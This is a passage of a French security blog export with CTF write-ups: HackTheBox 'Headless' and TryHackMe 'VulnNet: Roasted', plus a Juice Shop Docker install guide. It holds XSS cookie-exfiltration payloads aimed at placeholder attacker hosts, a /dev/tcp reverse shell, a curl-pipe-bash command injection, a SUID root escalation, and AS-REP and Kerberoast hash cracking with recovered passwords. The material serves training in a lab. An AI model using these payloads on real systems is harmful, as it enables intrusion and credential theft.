17\u0026lt;script\u0026gt;eval(atob(\u0026#39;ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp\u0026#39;));\u0026lt;/script\u0026gt; 18\u0026lt;script\u0026gt;fetch(\u0026#39;https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net\u0026#39;, {method: \u0026#39;POST\u0026#39;, mode: \u0026#39;no-cors\u0026#39;, body:document.cookie});\u0026lt;/script\u0026gt; 19\u0026lt;script\u0026gt;navigator.sendBeacon(\u0026#39;https://ssrftest.com/x/AAAAA\u0026#39;,document.cookie)\u0026lt;/script\u0026gt; Nous allons choisissait la commande suivante\n1\u0026lt;img src=x onerror=this.src=\u0026#34;http://\u0026lt;YOUR_SERVER_IP\u0026gt;/?c=\u0026#34;+document.cookie\u0026gt; Nous allons changer notre user-agent pour un user-agent de google afin que le serveur puisse accepter notre requête, on crée un nouvel agent avec qui se nomme xss avec comme string la commande xss Avant de lancer l\u0026rsquo;attaque, il faut créer un serveur pour récupérer les cookies.\n1python3 -m http.server 80 Une fois que l\u0026rsquo;attaque est lancée, on peut voir que le serveur a reçu les cookies.\n1[Mar 26, 2024 - 14:08:42 (CET)] exegol-htb /workspace: python3 -m http.server 9999 2Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ... 310.10.11.8 - - 26/Mar/2024 14:15:48] \u0026#34;GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1\u0026#34; 200 - Nous avons recu le cookie is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0\nOn peut voir que l\u0026rsquo;on ne peut pas se connecter au /dashboard Du coup nous allons essayer de connecter au /dashboard. Pour ça nous allons utiliser le cookie que nous avons reçu.\non va mettre le cookie dans une extension de navigateur avec Cookie-Editor\nUne fois tout bien préparé, on peut se connecter au /dashboard\nNous allons voir les requêtes http des dates que l\u0026rsquo;ont envoie au serveur via burpsuite\nOn peut voir que le serveur envoie une requête POST avec un paramètre date. On ajoute un reverse shell dans le paramètre date\nCréer un reverse shell dans un fichier shell.sh\n1/bin/bash -c \u0026#34;sh -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.62/9001 0\u0026gt;\u0026amp;1\u0026#34; Commande pour envoyer le reverse shell à notre machine\n1date=2023-09-15;curl http://\u0026lt;YOUR_IP\u0026gt;/shell.sh |bash User On peut voir que le serveur a reçu notre reverse shell\n1[Mar 26, 2024 - 15:07:15 (CET)] exegol-htb Headless # pwncat-cs -lp 9001 2[15:07:21] Welcome to pwncat 🐈! __main__.py:164 3[15:07:25] received connection from 10.10.11.8:42146 bind.py:84 4[15:07:26] 0.0.0.0:9001: upgrading from /usr/bin/dash to /usr/bin/bash manager.py:957 5[15:07:27] 10.10.11.8:42146: registered new host w/ db manager.py:957 6(local) pwncat: 7(remote) dvir@headless:/home/dvir/app: 1(remote) root@headless:/root# id 2uid=1000(dvir) gid=1000(dvir) euid=0(dvir) groups=1000(dvir),100(users) 3(remote) root@headless:/home/dvir# cat user.txt 40e*************ba Privilege Escalation 1(remote) dvir@headless:/home/dvir$ sudo -l 2Matching Defaults entries for dvir on headless: 3 env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty 4 5User dvir may run the following commands on headless: 6 (ALL) NOPASSWD: /usr/bin/syscheck On va regarder le fichier syscheck\n1(remote) dvir@headless:/home/dvir$ cat /usr/bin/syscheck 2#!/bin/bash 3 4if [ \u0026#34;$EUID\u0026#34; -ne 0 ]; then 5 exit 1 6fi 7 8last_modified_time=$(/usr/bin/find /boot -name \u0026#39;vmlinuz*\u0026#39; -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1) 9formatted_time=$(/usr/bin/date -d \u0026#34;@$last_modified_time\u0026#34; +\u0026#34;%d/%m/%Y %H:%M\u0026#34;) 10/usr/bin/echo \u0026#34;Last Kernel Modification Time: $formatted_time\u0026#34; 11 12disk_space=$(/usr/bin/df -h / | /usr/bin/awk \u0026#39;NR==2 {print $4}\u0026#39;) 13/usr/bin/echo \u0026#34;Available disk space: $disk_space\u0026#34; 14 15load_average=$(/usr/bin/uptime | /usr/bin/awk -F\u0026#39;load average:\u0026#39; \u0026#39;{print $2}\u0026#39;) 16/usr/bin/echo \u0026#34;System load average: $load_average\u0026#34; 17 18if ! /usr/bin/pgrep -x \u0026#34;initdb.sh\u0026#34; \u0026amp;\u0026gt;/dev/null; then 19 /usr/bin/echo \u0026#34;Database service is not running. Starting it...\u0026#34; 20 ./initdb.sh 2\u0026gt;/dev/null 21else 22 /usr/bin/echo \u0026#34;Database service is running.\u0026#34; 23fi 24 25exit 0 Nous pouvons voir que initdb.sh est lancé, il nous suffit donc de le créer et d\u0026rsquo;y placer une charge utile malveillante comme suit :\n1echo \u0026#34;chmod u+s /bin/bash\u0026#34; \u0026gt; initdb.sh 2chmod +x initdb.sh Exécuter ensuite /usr/bin/syscheck avec les privilèges sudo dans le même dossier que initdb.sh puis /bin/bash -p pour accéder à l\u0026rsquo;interpréteur de commandes racine\n1sudo /usr/bin/syscheck 2/bin/bash -p root 1(remote) root@headless:/root# id 2uid=1000(dvir) gid=1000(dvir) euid=0(root) groups=1000(dvir),100(users) 3(remote) root@headless:/root# cat root.txt 480*************ce Source https://book.hacktricks.xyz/\n","date":"March 26, 2024","img":"","lang":"en","langName":"English","largeImg":"","permalink":"/news/2024/03/headless/","series":[{"title":"News","url":"/series/news/"}],"smallImg":"","tags":[{"title":"HackTheBox","url":"/tags/hackthebox/"},{"title":"Web","url":"/tags/web/"},{"title":"XSS","url":"/tags/xss/"}],"timestamp":1711411200,"title":"Headless"},{"authors":[{"title":"Lukas","url":"/authors/lukas/"}],"categories":[{"title":"Web","url":"/categories/web/"}],"content":" C\u0026rsquo;est quoi Juice Shop ?\nJuice Shop est une application web vulnérable pour l\u0026rsquo;entraînement des testeurs de sécurité. Il est inspiré par les applications modernes qui utilisent des technologies JavaScript lourdes, telles que Angular et Node.js. Juice Shop est conçu pour être utilisé dans des ateliers de formation, des cours de sécurité informatique, des tests de pénétration ou des compétitions de capture du drapeau (CTF).\nPrérequis Spécifications minimales du système RAM: 256 MO CPU: 200 millicpu Espace disque libre: 300 Mo Spécifications système recommandées RAM: 384 MO CPU: 400 millicpu Espace disque disponible: 800 Mo Logiciels requis Docker Installation Pour l\u0026rsquo;instalation de Juice Shop on va utiliser Docker.\nAvant tout nous devons installer Docker sur notre machine. Pour cela, on peut suivre les instructions sur le site officiel de Docker : Docker\nDans un premier temps, on va créer un fichier de configuration myConfig.yml pour Juice Shop.\n1application: 2 logo: JuiceShopCTF_Logo.png 3 favicon: favicon_ctf.ico 4 showVersionNumber: false 5 showGitHubLinks: false 6 welcomeBanner: 7 showOnFirstStart: false 8challenges: 9 showHints: false 10 safetyOverride: true 11hackingInstructor: 12 isEnabled: false 13ctf: 14 showFlagsInNotifications: true Une fois le fichier de configuration créé, on peut lancer Juice Shop avec la commande suivante :\n1docker run -d -e \u0026#34;NODE_ENV=myConfig\u0026#34; -v /tmp/myConfig.yml:/juice-shop/config/myConfig.yml -p 3000:3000 --name juice-shop bkimminich/juice-shop Nous pouvons maintenant accéder à Juice Shop via l\u0026rsquo;adresse http://localhost:3000/ dans notre navigateur.\nOn peut y voir un drapeau rouge sur le logo de Juice Shop. Donc c\u0026rsquo;est parti pour la chasse aux drapeaux !\nConclusion Voila ! Nous avons installé Juice Shop sur notre machine. On peut maintenant s\u0026rsquo;amuser à tester les différentes vulnérabilités de l\u0026rsquo;application. Tout ça en Local, bien sûr !\n","date":"March 26, 2024","img":"","lang":"en","langName":"English","largeImg":"","permalink":"/news/2024/03/juice-shop/","series":[{"title":"News","url":"/series/news/"}],"smallImg":"","tags":[{"title":"Juice Shop","url":"/tags/juice-shop/"},{"title":"Web","url":"/tags/web/"},{"title":"Docker","url":"/tags/docker/"}],"timestamp":1711411200,"title":"Juice Shop"},{"authors":[{"title":"Lukas","url":"/authors/lukas/"}],"categories":[{"title":"Writeups","url":"/categories/writeups/"}],"content":" VulnNet Entertainment a rapidement déployé une nouvelle instance de gestion sur leur réseau très étendu…\nVulnNet Entertainment vient de déployer une nouvelle instance sur leur réseau avec les administrateurs systèmes récemment embauchés. En tant qu\u0026rsquo;entreprise soucieuse de la sécurité, ils vous ont, comme toujours, engagé pour réaliser un test de pénétration et voir comment les administrateurs systèmes se débrouillent.\nVulnNet Roasted Reconnaissance Nmap 1[May 12, 2024 - 11:38:12 (UTC)] exegol-thm VulnNet: Roasted # nmap -A 10.10.211.33 2Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-12 11:38 UTC 3Nmap scan report for 10.10.211.33 4Host is up (0.096s latency). 5Not shown: 990 closed tcp ports (reset) 6PORT STATE SERVICE VERSION 788/tcp filtered kerberos-sec 8135/tcp filtered msrpc 9139/tcp filtered netbios-ssn 10389/tcp filtered ldap 11464/tcp filtered kpasswd5 12593/tcp filtered http-rpc-epmap 13636/tcp filtered ldapssl 143268/tcp filtered globalcatLDAP 153269/tcp filtered globalcatLDAPssl 163389/tcp filtered ms-wbt-server 17Too many fingerprints match this host to give specific OS details 18Network Distance: 2 hops 19 20TRACEROUTE (using port 80/tcp) 21HOP RTT ADDRESS 221 62.48 ms 10.8.0.1 232 79.22 ms 10.10.211.33 Ports ouverts: 88/tcp: Kerberos 135/tcp: MSRPC (Microsoft Windows RPC) 139/tcp: NetBIOS (Microsoft Windows netbios-ssn) 389/tcp: LDAP (Lightweight Directory Access Protocol) 464/tcp: Kpasswd5 593/tcp: HTTP-RPC-EPMAP 636/tcp: LDAPSSL 3268/tcp: GlobalcatLDAP 3269/tcp: GlobalcatLDAPssl 3389/tcp: MS-WBT-SERVER (Microsoft Windows Remote Desktop) enum4linux 1[May 12, 2024 - 11:41:25 (UTC)] exegol-thm VulnNet: Roasted # enum4linux-ng -A 10.10.211.33 2ENUM4LINUX - next generation (v1.3.3) 3 4 ========================== 5| Target Information | 6 ========================== 7[*] Target ........... 10.10.211.33 8[*] Username ......... \u0026#39;\u0026#39; 9[*] Random Username .. \u0026#39;qadhxoqj\u0026#39; 10[*] Password ......... \u0026#39;\u0026#39; 11[*] Timeout .......... 5 second(s) 12 13 ===================================== 14| Listener Scan on 10.10.211.33 | 15 ===================================== 16[*] Checking LDAP 17[+] LDAP is accessible on 389/tcp 18[*] Checking LDAPS 19[+] LDAPS is accessible on 636/tcp 20[*] Checking SMB 21[+] SMB is accessible on 445/tcp 22[*] Checking SMB over NetBIOS 23[+] SMB over NetBIOS is accessible on 139/tcp 24 25 ==================================================== 26| Domain Information via LDAP for 10.10.211.33 | 27 ==================================================== 28[*] Trying LDAP 29[+] Appears to be root/parent DC 30[+] Long domain name is: vulnnet-rst.local 31 32 =========================================================== 33| NetBIOS Names and Workgroup/Domain for 10.10.211.33 | 34 =========================================================== 35[-] Could not get NetBIOS names information via \u0026#39;nmblookup\u0026#39;: timed out 36 37 ========================================= 38| SMB Dialect Check on 10.10.211.33 | 39 ========================================= 40[*] Trying on 445/tcp 41[+] Supported dialects and settings: 42Supported dialects: 43 SMB 1.0: false 44 SMB 2.02: true 45 SMB 2.1: true 46 SMB 3.0: true 47 SMB 3.1.1: true 48Preferred dialect: SMB 3.0 49SMB1 only: false 50SMB signing required: true 51 52 =========================================================== 53| Domain Information via SMB session for 10.10.211.33 | 54 =========================================================== 55[*] Enumerating via unauthenticated SMB session on 445/tcp 56[+] Found domain information via SMB 57NetBIOS computer name: WIN-2BO8M1OE1M1 58NetBIOS domain name: VULNNET-RST 59DNS domain: vulnnet-rst.local 60FQDN: WIN-2BO8M1OE1M1.vulnnet-rst.local 61Derived membership: domain member 62Derived domain: VULNNET-RST 63 64 ========================================= 65| RPC Session Check on 10.10.211.33 | 66 ========================================= 67[*] Check for null session 68[-] Could not establish null session: timed out 69[*] Check for random user 70[-] Could not establish random user session: timed out 71[-] Sessions failed, neither null nor user sessions were possible 72 73 =============================================== 74| OS Information via RPC for 10.10.211.33 | 75 =============================================== 76[*] Enumerating via unauthenticated SMB session on 445/tcp 77[+] Found OS information via SMB 78[*] Enumerating via \u0026#39;srvinfo\u0026#39; 79[-] Skipping \u0026#39;srvinfo\u0026#39; run, not possible with provided credentials 80[+] After merging OS information we have the following result: 81OS: Windows 10, Windows Server 2019, Windows Server 2016 82OS version: \u0026#39;10.0\u0026#39; 83OS release: \u0026#39;1809\u0026#39; 84OS build: \u0026#39;17763\u0026#39; 85Native OS: not supported 86Native LAN manager: not supported 87Platform id: null 88Server type: null 89Server type string: null 90 91[!] Aborting remainder of tests since sessions failed, rerun with valid credentials 92 93Completed after 60.57 seconds Les informations obtenues sont les suivantes:\nNom de l\u0026rsquo;ordinateur NetBIOS: WIN-2BO8M1OE1M1 Nom de domaine NetBIOS: VULNNET-RST Domaine DNS: vulnnet-rst.local FQDN: WIN-2BO8M1OE1M1.vulnnet-rst.local OS: Windows 10, Windows Server 2019, Windows Server 2016 Version de l\u0026rsquo;OS: 10.0 Une fois ça fais on peux regarder les SID du domaine avec rpcclient:\nC\u0026rsquo;set quoi un SID ? Le SID (Security Identifier) est un identifiant unique attribué à chaque compte utilisateur, groupe ou ordinateur dans un domaine Active Directory. Il est utilisé pour identifier de manière unique un objet ou une entité dans un domaine Active Directory.\n1[May 12, 2024 - 11:47:35 (UTC)] exegol-thm VulnNet: Roasted # lookupsid.py guest@10.10.211.33 2Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs 3 4Password: 5[*] Brute forcing SIDs at 10.10.211.33 6[*] StringBinding ncacn_np:10.10.211.33[\\pipe\\lsarpc] 7[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213 8498: VULNNET-RST\\Enterprise Read-only Domain Controllers (SidTypeGroup) 9500: VULNNET-RST\\Administrator (SidTypeUser) 10501: VULNNET-RST\\Guest (SidTypeUser) 11502: VULNNET-RST\\krbtgt (SidTypeUser) 12512: VULNNET-RST\\Domain Admins (SidTypeGroup) 13513: VULNNET-RST\\Domain Users (SidTypeGroup) 14514: VULNNET-RST\\Domain Guests (SidTypeGroup) 15515: VULNNET-RST\\Domain Computers (SidTypeGroup) 16516: VULNNET-RST\\Domain Controllers (SidTypeGroup) 17517: VULNNET-RST\\Cert Publishers (SidTypeAlias) 18518: VULNNET-RST\\Schema Admins (SidTypeGroup) 19519: VULNNET-RST\\Enterprise Admins (SidTypeGroup) 20520: VULNNET-RST\\Group Policy Creator Owners (SidTypeGroup) 21521: VULNNET-RST\\Read-only Domain Controllers (SidTypeGroup) 22522: VULNNET-RST\\Cloneable Domain Controllers (SidTypeGroup) 23525: VULNNET-RST\\Protected Users (SidTypeGroup) 24526: VULNNET-RST\\Key Admins (SidTypeGroup) 25527: VULNNET-RST\\Enterprise Key Admins (SidTypeGroup) 26553: VULNNET-RST\\RAS and IAS Servers (SidTypeAlias) 27571: VULNNET-RST\\Allowed RODC Password Replication Group (SidTypeAlias) 28572: VULNNET-RST\\Denied RODC Password Replication Group (SidTypeAlias) 291000: VULNNET-RST\\WIN-2BO8M1OE1M1$ (SidTypeUser) 301101: VULNNET-RST\\DnsAdmins (SidTypeAlias) 311102: VULNNET-RST\\DnsUpdateProxy (SidTypeGroup) 321104: VULNNET-RST\\enterprise-core-vn (SidTypeUser) 331105: VULNNET-RST\\a-whitehat (SidTypeUser) 341109: VULNNET-RST\\t-skid (SidTypeUser) 351110: VULNNET-RST\\j-goldenhand (SidTypeUser) 361111: VULNNET-RST\\j-leet (SidTypeUser) BINGO ! On a des utilisateurs:\na-whitehat enterprise-core-vn j-goldenhand j-leet t-skid Exploitation As-Rep Roasting C\u0026rsquo;est quoi l\u0026rsquo;As-Rep Roasting ?\nL\u0026rsquo;attaque AS-REP Roasting est une attaque contre les comptes Active Directory qui n\u0026rsquo;ont pas l\u0026rsquo;attribut UF_DONT_REQUIRE_PREAUTH défini. L\u0026rsquo;attaque consiste à envoyer une demande de ticket Kerberos pour un utilisateur qui n\u0026rsquo;a pas l\u0026rsquo;attribut UF_DONT_REQUIRE_PREAUTH défini. L\u0026rsquo;attaque est appelée \u0026ldquo;roasting\u0026rdquo; car l\u0026rsquo;attaquant peut récupérer le hash du mot de passe de l\u0026rsquo;utilisateur sans avoir besoin de déchiffrer le trafic réseau.\n1[May 12, 2024 - 11:52:48 (UTC)] exegol-thm VulnNet: Roasted # GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip \u0026#34;10.10.211.33\u0026#34; \u0026#34;vulnnet-rst.local\u0026#34;/ 2Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs 3 4[-] User a-whitehat doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set 5[-] User enterprise-core-vn doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set 6[-] User j-goldenhand doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set 7[-] User j-leet doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set 8$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:02349b9312c22cce838b122bbb4e6576$247f0fe80f8d9c3ced75694bf421006a815c89b6f98382b865582e42d4e4c248b36130f42f68de4c914c908c8c9adef2dc8173e8090d25b7bfec3bec292f64dd1ed1514415075d07399f13c3ca287be9c99e6b2a668fbfda658621cdb6ec13a81334e7acd95d261335b1f8454b1e8ab7f57996810fd98dbb65feeb0f706bf9652c8e304098ba05dc2fcb750b19487a66ea3689f67b1196efa17da808124ad220c623c2eb0f77d54e9304f3fb3346099e5f9e7d8fed0f3c5247d20d258dc25c8eb4455a6513b01399cfd6e7f24f332a9438b26fc6222977738773fcfeff4c63566f850dca6fc6cc72fd1df73d9e835d5218d63d615e19 On a récupéré le hash du mot de passe de l\u0026rsquo;utilisateur t-skid.\nCracking On peut maintenant cracker le hash récupéré avec John The Ripper:\n1[May 12, 2024 - 11:54:10 (UTC)] exegol-thm VulnNet: Roasted # john --wordlist=`fzf-wordlists` ASREProastables.txt 2Using default input encoding: UTF-8 3Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x]) 4Cost 1 (etype) is 23 for all loaded hashes 5Will run 8 OpenMP threads 6Press \u0026#39;q\u0026#39; or Ctrl-C to abort, \u0026#39;h\u0026#39; for help, almost any other key for status 7tj072889* ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL) 81g 0:00:00:01 DONE (2024-05-12 11:54) 0.6803g/s 2184Kp/s 2184Kc/s 2184KC/s tomaatjuh..tigris@livs 9Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably 10Session completed. Le mot de passe de l\u0026rsquo;utilisateur t-skid est tj072889.\nKerberoasting C\u0026rsquo;est quoi le Kerberoasting ?\nL\u0026rsquo;attaque Kerberoasting est une attaque contre les comptes Active Directory qui ont l\u0026rsquo;attribut servicePrincipalName défini. L\u0026rsquo;attaque consiste à envoyer une demande de ticket Kerberos pour un utilisateur qui a l\u0026rsquo;attribut servicePrincipalName défini. L\u0026rsquo;attaque est appelée \u0026ldquo;roasting\u0026rdquo; car l\u0026rsquo;attaquant peut récupérer le hash du mot de passe de l\u0026rsquo;utilisateur sans avoir besoin de déchiffrer le trafic réseau.\n1[May 12, 2024 - 12:03:25 (UTC)] exegol-thm VulnNet: Roasted # GetUserSPNs.py \u0026#39;VULNNET-RST.local/t-skid:tj072889*\u0026#39; -outputfile hashes -dc-ip 10.10.211.33 2Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs 3 4ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation 5---------------------- ------------------ ------------------------------------------------------------- -------------------------- -------------------------- ---------- 6CIFS/vulnnet-rst.local enterprise-core-vn CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local 2021-03-11 19:45:09.913979 2021-03-13 23:41:17.987528 7 8 9 10[-] CCache file is not found. Skipping... On a récupéré le hash du mot de passe de l\u0026rsquo;utilisateur enterprise-core-vn.\n1[May 12, 2024 - 12:03:42 (UTC)] exegol-thm VulnNet: Roasted # cat hashes 2$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$VULNNET-RST.local/enterprise-core-vn*$964e72ce6bca5255ff16822ec093621b$f4205c6f1560b7ccf8e41ea21919930a479b710eba5871ea2c2cae415115692801ce950513bfd01c8042faa4cdbe9cf01abfd13d8d593b6cf0125697dc69a482595497675584e7056b02ae92b49fe416a490103307191c092784c56c72ca18dedd843cd1568f085eaef37e4d107b346c6d4d03c9fc1e7c9b5c03f50d757a34d94f370b51fc841e61737520afd60eb4c2f94fde83c3e3773b1a4620051521c3045ea80c76181e2feb164c52bc6b8e8b5c20beb6cca6d7c12db081bf451c78f29ec884489ba4b58173877db82e862d1a1d2bf26f158f0d9c33badd596f181f37314beffefa60bd29f4da41aac80ff56f3eae5de78036f94aa552d91974c106c8609bc80cc81d5794172cd3bc56bb4da847d13cd320dd93343cb4743ab9f0907e79dea28fe5de0d9fb4fc0ea89dc514dd0b6d19915714b5b4d44cefaf859dd0afdcc1b6b11a666ecdc0a84c35d8116821570921f5ce236bba8225d77c52c0c06fab5c0dc5437cea9094af4cc37a550ecfdc4cb022589396f4cfdc7d3b559646b14a379df69656cd11213a155d95f47a220715c11061a3af33b81dfa836a3a7553874a5a936bea2dc9a284bcf2fcb5c582877dc9976d5d2d29ebbf84ea8853dc413512eb7d1dcf47b68b6ad17705b0b732c449ca9c4bb8801b63e90c825da161c0365211b4d4f54a6126b838f362c9b3d9ee234bb794021e6bf9645ff3ca0768885586d966d10ad540cffe06d18e617990a9b9f63c20c252cae2af2570e9a369d14debbcda58b768d274be8d3710c3fc8d497bfca1553fedf2017cfbf4808ac80a8a1b49961131af64dcb21ab0dfeb1b89b331b17e0349984a875039baf81cc1cc8e4d015c503ccc7065851b073ff1191413b763162bcca1588d1fca4db8830542eed9b561d376194183d078035ce74125b10c85841043cff5c2302965e55004810ca63d11260bab81ddc0456be7b2278b655dfd59683893dccdfc024c9cc0acb819dcf9f0cbafa29e8b22213a243451cfe902bf4051bd862ea80620c002502c9744dd143b11336782d9a2b815b17245faca22653b03c6367a9a36b22b312ba51e5e7bf1ef780a88d9e4c9f8bdf3ac58251c0199ff1dab58db3512c68a3ee3487f8142290f9ae2a9fc8d24faeadf204a8059f65288e929f78f09a57e8af2b2f2e0f13d222c339c58a23a5bbbca580a88d80c9055e2b39d7263e67ee16754fa788b3cca777354ccace352a664f45949aebf8492eb5996e765bbb266f418921e06a37bbcd234d2263999f9e029195bfe73421c1834f608d6f0efae2924478a8648a4c2d9af8481274e60f824c9ed022c501bf4e907c2318f88cf6119c8e15c205f51e283556aae05b2078411102b01e7d05fb09934d3c394846fcb03ceb730f4 Cracking On peut maintenant cracker le hash récupéré avec John The Ripper:\n1[May 12, 2024 - 12:03:49 (UTC)] exegol-thm VulnNet: Roasted # john --wordlist=`fzf-wordlists` hashes 2Using default input encoding: UTF-8 3Loaded 1 password hash (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4]) 4Will run 8 OpenMP threads 5Press \u0026#39;q\u0026#39; or Ctrl-C to abort, \u0026#39;h\u0026#39; for help, almost any other key for status 6ry=ibfkfv,s6h, (?) 71g 0:00:00:01 DONE (2024-05-12 12:04) 0.8621g/s 3559Kp/s 3559Kc/s 3559KC/s sadeceben123..ruddle 8Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably 9Session completed. Parfait ! On a récupéré le mot de passe de l\u0026rsquo;utilisateur enterprise-core-vn qui est ry=ibfkfv,s6h,.\nEvil-WinRM Maintenant on peut se connecter à la machine avec Evil-WinRM:\n1[May 12, 2024 - 12:06:27 (UTC)] exegol-thm VulnNet: Roasted # evil-winrm -i 10.10.211.33 -u \u0026#39;enterprise-core-vn\u0026#39; -p \u0026#39;ry=ibfkfv,s6h,\u0026#39; 2 3 4Evil-WinRM shell v3.5 5 6Info: Establishing connection to remote endpoint 7 8*Evil-WinRM* PS C:\\Users\\enterprise-core-vn\\Documents\u0026gt; dir 9*Evil-WinRM* PS C:\\Users\\enterprise-core-vn\\Documents\u0026gt; cd .. 10*Evil-WinRM* PS C:\\Users\\enterprise-core-vn\u0026gt; cd \u0026#34;C:/Users/enterprise-core-vn/Desktop/\u0026#34; 11*Evil-WinRM* PS C:\\Users\\enterprise-core-vn\\Desktop\u0026gt; type \u0026#34;C:/Users/enterprise-core-vn/Desktop/user.txt\u0026#34; 12THM{726b7c0baaac1455d05c827b5561f4ed} 13*Evil-WinRM* PS C:\\Users\\enterprise-core-vn\\Desktop\u0026gt; On a récupéré le flag utilisateur THM{726b7c0baaac1455d05c827b5561f4ed}.\nEscalade de privilèges SMB On peut maintenant regarder les partages SMB avec smbmap:\n1[May 12, 2024 - 12:14:43 (UTC)] exegol-thm VulnNet: Roasted # smbmap -H \u0026#34;10.10.211.33\u0026#34; -u \u0026#39;enterprise-core-vn\u0026#39; -p \u0026#39;ry=ibfkfv,s6h,\u0026#39; 2 3 ________ ___ ___ _______ ___ ___ __ _______ 4 /\u0026#34; )|\u0026#34; \\ /\u0026#34; || _ \u0026#34;\\ |\u0026#34; \\ /\u0026#34; | /\u0026#34;\u0026#34;\\ | __ \u0026#34;\\ 5 (: \\___/ \\ \\ // |(. |_) :) \\ \\ // | / \\ (. |__) :) 6 \\___ \\ /\\ \\/. ||: \\/ /\\ \\/. | /\u0026#39; /\\ \\ |: ____/ 7 __/ \\ |: \\. |(| _ \\ |: \\. | // __\u0026#39; \\ (| / 8 /\u0026#34; \\ :) |. \\ /: ||: |_) :)|. \\ /: | / / \\ \\ /|__/ \\ 9 (_______/ |___|\\__/|___|(_______/ |___|\\__/|___|(___/ \\___)(_______) 10 ----------------------------------------------------------------------------- 11 SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com 12 https://github.com/ShawnDEvans/smbmap 13 14[*] Detected 1 hosts serving SMB 15[*] Established 1 SMB connections(s) and 1 authentidated session(s) 16 17[+] IP: 10.10.211.33:445\tName: vulnnet-rst.local Status: Authenticated 18\tDisk Permissions\tComment 19\t---- -----------\t------- 20\tADMIN$ NO ACCESS\tRemote Admin 21\tC$ NO ACCESS\tDefault share 22\tIPC$ READ ONLY\tRemote IPC 23\tNETLOGON READ ONLY\tLogon server share 24\tSYSVOL READ ONLY\tLogon server share 25\tVulnNet-Business-Anonymous READ ONLY\tVulnNet Business Sharing 26\tVulnNet-Enterprise-Anonymous READ ONLY\tVulnNet Enterprise Sharing On a deux partages SMB:\nVulnNet-Business-Anonymous VulnNet-Enterprise-Anonymous Les autre partages sont des partages par défaut de Windows.\n1[May 12, 2024 - 12:18:05 (UTC)] exegol-thm VulnNet: Roasted # smbclient \\\\\\\\10.10.211.33\\\\SYSVOL -U \u0026#39;enterprise-core-vn%ry=ibfkfv,s6h,\u0026#39; 2Try \u0026#34;help\u0026#34; to get a list of possible commands. 3smb: \\\u0026gt; ls 4 . D 0 Thu Mar 11 19:19:49 2021 5 .. D 0 Thu Mar 11 19:19:49 2021 6 vulnnet-rst.local Dr 0 Thu Mar 11 19:19:49 2021 7 8\t8771839 blocks of size 4096. 4553871 blocks available 9smb: \\\u0026gt; cd vulnnet-rst.local\\ 10smb: \\vulnnet-rst.local\\\u0026gt; ls 11 . D 0 Thu Mar 11 19:23:40 2021 12 .. D 0 Thu Mar 11 19:23:40 2021 13 DfsrPrivate DHSr 0 Thu Mar 11 19:23:40 2021 14 Policies D 0 Thu Mar 11 19:20:26 2021 15 scripts D 0 Tue Mar 16 23:15:49 2021 16 17\t8771839 blocks of size 4096. 4553871 blocks available 18smb: \\vulnnet-rst.local\\\u0026gt; cd scripts\\ 19smb: \\vulnnet-rst.local\\scripts\\\u0026gt; ls 20 . D 0 Tue Mar 16 23:15:49 2021 21 .. D 0 Tue Mar 16 23:15:49 2021 22 ResetPassword.vbs A 2821 Tue Mar 16 23:18:14 2021 23 24\t8771839 blocks of size 4096. 4553871 blocks available 25smb: \\vulnnet-rst.local\\scripts\\\u0026gt; wget ResetPassword.vbs 26wget: command not found 27smb: \\vulnnet-rst.local\\scripts\\\u0026gt; get ResetPassword.vbs 28getting file \\vulnnet-rst.local\\scripts\\ResetPassword.vbs of size 2821 as ResetPassword.vbs (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec) 29smb: \\vulnnet-rst.local\\scripts\\\u0026gt; exit On a récupéré le script ResetPassword.vbs.\n1 [May 12, 2024 - 12:20:21 (UTC)] exegol-thm VulnNet: Roasted # cat ResetPassword.vbs 2Option Explicit 3 4Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain 5Dim strUserDN, objUser, strPassword, strUserNTName 6 7\u0026#39; Constants for the NameTranslate object. 8Const ADS_NAME_INITTYPE_GC = 3 9Const ADS_NAME_TYPE_NT4 = 3 10Const ADS_NAME_TYPE_1779 = 1 11 12If (Wscript.Arguments.Count \u0026lt;\u0026gt; 0) Then 13 Wscript.Echo \u0026#34;Syntax Error. Correct syntax is:\u0026#34; 14 Wscript.Echo \u0026#34;cscript ResetPassword.vbs\u0026#34; 15 Wscript.Quit 16End If 17 18strUserNTName = \u0026#34;a-whitehat\u0026#34; 19strPassword = \u0026#34;bNdKVkjv3RR9ht\u0026#34; 20 21\u0026#39; Determine 